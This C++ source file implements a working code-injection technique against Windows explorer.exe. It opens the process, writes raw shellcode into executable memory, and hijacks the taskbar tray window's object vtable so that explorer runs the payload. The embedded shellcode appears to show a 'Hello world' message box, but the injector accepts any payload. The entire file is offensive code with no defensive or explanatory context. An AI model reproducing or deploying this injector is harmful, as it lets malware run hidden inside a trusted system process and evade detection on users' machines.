// ctrayinject.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <Windows.h>
#include "processutils.h"

unsigned char shellCode[512] = {
    0x48, 0x83, 0xEC, 0x28, 0x48, 0x83, 0xE4, 0xF0, 0x48, 0x8D, 0x15, 0x66,
    0x00, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x52, 0x00, 0x00, 0x00, 0xE8, 0x9E,
    0x00, 0x00, 0x00, 0x4C, 0x8B, 0xF8, 0x48, 0x8D, 0x0D, 0x5D, 0x00, 0x00,
    0x00, 0xFF, 0xD0, 0x48, 0x8D, 0x15, 0x5F, 0x00, 0x00, 0x00, 0x48, 0x8D,
    0x0D, 0x4D, 0x00, 0x00, 0x00, 0xE8, 0x7F, 0x00, 0x00, 0x00, 0x4D, 0x33,
    0xC9, 0x4C, 0x8D, 0x05, 0x61, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x4E,
    0x00, 0x00, 0x00, 0x48, 0x33, 0xC9, 0xFF, 0xD0, 0x48, 0x8D, 0x15, 0x56,
    0x00, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x0A, 0x00, 0x00, 0x00, 0xE8, 0x56,
    0x00, 0x00, 0x00, 0x48, 0x33, 0xC9, 0xFF, 0xD0, 0x4B, 0x45, 0x52, 0x4E,
    0x45, 0x4C, 0x33, 0x32, 0x2E, 0x44, 0x4C, 0x4C, 0x00, 0x4C, 0x6F, 0x61,
    0x64, 0x4C, 0x69, 0x62, 0x72, 0x61, 0x72, 0x79, 0x41, 0x00, 0x55, 0x53,
    0x45, 0x52, 0x33, 0x32, 0x2E, 0x44, 0x4C, 0x4C, 0x00, 0x4D, 0x65, 0x73,
    0x73, 0x61, 0x67, 0x65, 0x42, 0x6F, 0x78, 0x41, 0x00, 0x48, 0x65, 0x6C,
    0x6C, 0x6F, 0x20, 0x77, 0x6F, 0x72, 0x6C, 0x64, 0x00, 0x4D, 0x65, 0x73,
    0x73, 0x61, 0x67, 0x65, 0x00, 0x45, 0x78, 0x69, 0x74, 0x50, 0x72, 0x6F,
    0x63, 0x65, 0x73, 0x73, 0x00, 0x48, 0x83, 0xEC, 0x28, 0x65, 0x4C, 0x8B,
    0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x4D, 0x8B, 0x40, 0x18, 0x4D, 0x8D,
    0x60, 0x10, 0x4D, 0x8B, 0x04, 0x24, 0xFC, 0x49, 0x8B, 0x78, 0x60, 0x48,
    0x8B, 0xF1, 0xAC, 0x84, 0xC0, 0x74, 0x26, 0x8A, 0x27, 0x80, 0xFC, 0x61,
    0x7C, 0x03, 0x80, 0xEC, 0x20, 0x3A, 0xE0, 0x75, 0x08, 0x48, 0xFF, 0xC7,
    0x48, 0xFF, 0xC7, 0xEB, 0xE5, 0x4D, 0x8B, 0x00, 0x4D, 0x3B, 0xC4, 0x75,
    0xD6, 0x48, 0x33, 0xC0, 0xE9, 0xA7, 0x00, 0x00, 0x00, 0x49, 0x8B, 0x58,
    0x30, 0x44, 0x8B, 0x4B, 0x3C, 0x4C, 0x03, 0xCB, 0x49, 0x81, 0xC1, 0x88,
    0x00, 0x00, 0x00, 0x45, 0x8B, 0x29, 0x4D, 0x85, 0xED, 0x75, 0x08, 0x48,
    0x33, 0xC0, 0xE9, 0x85, 0x00, 0x00, 0x00, 0x4E, 0x8D, 0x04, 0x2B, 0x45,
    0x8B, 0x71, 0x04, 0x4D, 0x03, 0xF5, 0x41, 0x8B, 0x48, 0x18, 0x45, 0x8B,
    0x50, 0x20, 0x4C, 0x03, 0xD3, 0xFF, 0xC9, 0x4D, 0x8D, 0x0C, 0x8A, 0x41,
    0x8B, 0x39, 0x48, 0x03, 0xFB, 0x48, 0x8B, 0xF2, 0xA6, 0x75, 0x08, 0x8A,
    0x06, 0x84, 0xC0, 0x74, 0x09, 0xEB, 0xF5, 0xE2, 0xE6, 0x48, 0x33, 0xC0,
    0xEB, 0x4E, 0x45, 0x8B, 0x48, 0x24, 0x4C, 0x03, 0xCB, 0x66, 0x41, 0x8B,
    0x0C, 0x49, 0x45, 0x8B, 0x48, 0x1C, 0x4C, 0x03, 0xCB, 0x41, 0x8B, 0x04,
    0x89, 0x49, 0x3B, 0xC5, 0x7C, 0x2F, 0x49, 0x3B, 0xC6, 0x73, 0x2A, 0x48,
    0x8D, 0x34, 0x18, 0x48, 0x8D, 0x7C, 0x24, 0x30, 0x4C, 0x8B, 0xE7, 0xA4,
    0x80, 0x3E, 0x2E, 0x75, 0xFA, 0xA4, 0xC7, 0x07, 0x44, 0x4C, 0x4C, 0x00,
    0x49, 0x8B, 0xCC, 0x41, 0xFF, 0xD7, 0x49, 0x8B, 0xCC, 0x48, 0x8B, 0xD6,
    0xE9, 0x14, 0xFF, 0xFF, 0xFF, 0x48, 0x03, 0xC3, 0x48, 0x83, 0xC4, 0x28,
    0xC3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};


// CTray object for Shell_TrayWnd
typedef struct _ctray_vtable {
    ULONG_PTR vTable;    // change to remote memory address
    ULONG_PTR AddRef;
    ULONG_PTR Release;
    ULONG_PTR WndProc;   // window procedure (change to payload)
} CTray;

int InjectIntoCTray(LPVOID payload, DWORD payloadSize);

int main(int argc, char** argv)
{
    return InjectIntoCTray(shellCode, sizeof(shellCode));
}

int InjectIntoCTray(LPVOID payload, DWORD payloadSize) {
    SIZE_T writtenBytes;
    HANDLE payloadAddress = 0;
    HANDLE newTrayAddress = 0;
    int result = 0;

    // Locate tray window.
    auto windowHandle = FindWindow(L"Shell_TrayWnd", NULL);
    if (windowHandle == INVALID_HANDLE_VALUE)
        return PrintLastError("FindWindow");

    // Find and open parent process ( = explorer.exe )
    DWORD pid;
    GetWindowThreadProcessId(windowHandle, &pid);

    auto processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (processHandle == INVALID_HANDLE_VALUE)
        return PrintLastError("OpenProcess");

    do
    {
        // Read tray structure.
        auto ctrayPointer = GetWindowLongPtr(windowHandle, 0);
        if (ctrayPointer == 0)
        {
            result = PrintLastError("GetWindowLongPtr");
            break;
        }

        CTray ctray;
        if (!ReadProcessMemory(processHandle, (LPVOID)ctrayPointer, (LPVOID)&ctray.vTable, sizeof(ULONG_PTR), &writtenBytes))
        {
            result = PrintLastError("ReadProcessMemory (ctray pointer)");
            break;
        }

        if (!ReadProcessMemory(processHandle, (LPVOID)ctray.vTable, (LPVOID)&ctray.AddRef, sizeof(ULONG_PTR) * 3, &writtenBytes))
        {
            return PrintLastError("ReadProcessMemory (vtable reads)");
            break;
        }

        // Allocate and write new WndProc function into the process.
        payloadAddress = VirtualAllocEx(processHandle, NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (payloadAddress == NULL)
        {
            result = PrintLastError("VirtualAllocEx (payload)");
            break;
        }

        if (!WriteProcessMemory(processHandle, payloadAddress, payload, payloadSize, &writtenBytes))
        {
            result = PrintLastError("WriteProcessMemory (payload)");
            break;
        }

        // Allocate and write new tray structure into the process.
        newTrayAddress = VirtualAllocEx(processHandle, NULL, sizeof(ctray), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (newTrayAddress == NULL)
        {
            result = PrintLastError("VirtualAllocEx (new ctray)");
            break;
        }

        ctray.vTable = (ULONG_PTR)newTrayAddress + sizeof(ULONG_PTR);
        ctray.WndProc = (ULONG_PTR)payloadAddress;

        if (!WriteProcessMemory(processHandle, newTrayAddress, &ctray, sizeof(ctray), &writtenBytes))
        {
            result = PrintLastError("WriteProcessMemory (new ctray)");
            break;
        }

        // Override old tray with new tray vtable.
        if (SetWindowLongPtr(windowHandle, 0, (ULONG_PTR)newTrayAddress) == 0)
        {
            result = PrintLastError("SetWindowLongPtr (new ctray)");
            break;
        }

        // Trigger.
        if (PostMessage(windowHandle, WM_CLOSE, 0, 0) == 0)
        {
            result = PrintLastError("PostMessage");
            break;
        }

        // Wait for it to be triggered. Increase time if nothing happens.
        Sleep(1000);

        // Restore old tray structure.
        if (SetWindowLongPtr(windowHandle, 0, ctrayPointer) == 0)
        {
            result = PrintLastError("SetWindowLongPtr (restore)");
            break;
        }
    } while (false);

    if (payloadAddress)
        VirtualFreeEx(processHandle, payloadAddress, 0, MEM_DECOMMIT | MEM_RELEASE);
    if (newTrayAddress)
        VirtualFreeEx(processHandle, newTrayAddress, 0, MEM_DECOMMIT | MEM_RELEASE);
    CloseHandle(processHandle);
    return ERROR_SUCCESS;
}